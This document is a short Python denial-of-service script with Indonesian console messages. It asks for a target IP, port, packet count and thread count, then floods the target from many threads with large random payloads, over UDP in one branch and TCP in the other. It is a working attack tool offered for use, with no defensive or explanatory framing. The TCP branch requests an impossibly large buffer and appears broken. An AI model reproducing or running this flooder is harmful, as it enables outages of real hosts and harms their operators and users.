#!/usr/bin/env python3
import random
import socket
import threading



print       (" - - > SERANG!!!!!!!!!! <- - ")
print       (" - - > BISMILLAH DULU <- - ")
    
ip = str(input("  Ip:"))
port = int(input(" Port:"))
choice = str(input("  (y/n):"))
times = int(input(" Paket :"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(123456789)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Rinus Attacking ")
		except:
			print("[!] RUSAK")


def run2():
	data = random._urandom(12345678910121415)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Rinus Attacking ")
		except:
			s.close()
			print("[*] RUSAK")


for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
